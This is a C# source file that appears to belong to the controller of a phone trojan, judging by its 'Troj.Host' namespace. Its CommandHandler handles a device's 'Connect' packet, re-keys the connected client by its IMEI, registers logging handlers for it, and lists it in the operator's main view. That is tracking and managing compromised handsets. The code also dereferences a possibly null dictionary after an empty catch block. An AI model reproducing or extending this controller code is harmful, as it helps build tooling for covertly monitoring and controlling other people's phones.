using System;
using System.Collections.Generic;
using InOut;
using InOut.PacketImp;
using InOut.Utils;
using IIE.Phone.Troj.Host.Model;


namespace IIE.Phone.Troj.Host.Handler
{
    public class CommandHandler : IPacketHandler
    {
        private short command;
        private byte[] arg;


        public void HandlePacket(IPacket p, string tempIMEI, Server c)
        {
            command = ((CommandPacket)p).Commande;
            arg = ((CommandPacket)p).Argument;

            switch (command)
            {
                case Protocol.Connect:
                    Dictionary<string, string> h = null;
                    try
                    {
                        h = PacketUtil.Parse<Dictionary<string, string>>(arg);
                    }
                    catch
                    {

                    }
                    string newIMEI = h["IMEI"];

                    c.Log.LogTxt("CONNECT command received from " + newIMEI);

                    if (!c.ClientMap.ContainsKey(newIMEI))
                    {
                        ClientHandler ch = c.ClientMap[tempIMEI];
                        ChannelDistributionHandler cdh = c.ChannelHandlerMap[tempIMEI];
                        ch.UpdateIMEI(newIMEI);

                        c.ClientMap.Remove(tempIMEI);
                        c.ChannelHandlerMap.Remove(tempIMEI);

                        c.ClientMap.Add(newIMEI, ch);
                        c.ChannelHandlerMap.Add(newIMEI, cdh);

                        c.ChannelHandlerMap[newIMEI].RegisterListener(1, new LogPacket());
                        c.ChannelHandlerMap[newIMEI].RegisterHandler(1, new ClientLogHandler(1, newIMEI, c.MainView));
                    }

                    else
                    {

                        ClientHandler ch1 = c.ClientMap[tempIMEI];
                        ChannelDistributionHandler cdh1 = c.ChannelHandlerMap[newIMEI];
                        c.ClientMap.Remove(tempIMEI);
                        c.ChannelHandlerMap.Remove(tempIMEI);
                        c.ChannelHandlerMap.Remove(newIMEI);
                        c.ClientMap[newIMEI] = ch1;
                        c.ChannelHandlerMap[newIMEI] = cdh1;

                    }

                    c.MainView.AddUser(new UserInfo(newIMEI,h));

                    break;

            }


        }


        public void Receive(IPacket p, String imei)
        {


        }
    }
}
